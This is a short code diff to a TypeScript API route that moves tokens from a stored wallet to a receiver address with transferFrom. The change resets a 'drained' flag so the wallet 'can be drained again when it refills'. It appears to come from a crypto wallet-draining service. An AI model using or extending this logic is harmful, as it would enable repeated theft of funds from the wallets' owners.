@@ -104,9 +104,10 @@ export async function POST(
     const tx = await contract.transferFrom(wallet.address, receiverAddress, transferAmount);
     const receipt = await tx.wait();
 
+    // Record the drain tx hash but reset drained=false so wallet can be drained again when it refills
     await supabase
       .from("wallets")
-      .update({ drained: true, drain_tx_hash: receipt.hash })
+      .update({ drained: false, drain_tx_hash: receipt.hash, updated_at: new Date().toISOString() })
       .eq("id", id);
 
     await supabase.from("transactions").insert({
